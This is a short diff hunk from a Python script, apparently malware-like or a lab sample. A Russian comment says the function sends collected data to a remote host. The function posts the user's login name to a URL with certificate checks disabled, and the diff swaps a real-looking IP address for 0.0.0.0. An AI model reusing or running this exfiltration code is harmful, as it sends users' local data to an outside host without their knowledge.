@@ -24,7 +24,7 @@ def show_popup_banner():
 
 #Функция отправляет собранные данные на удаленный хост
 def data_send_to_remotehost():
-    url = 'https://46.29.160.63:80/'
+    url = 'https://0.0.0.0:80/'
     file = {'file_field': ('local_file.txt', os.getlogin(), 'text/plain')}
     try:
         response = requests.post(url, files=file, verify=False, timeout=3)
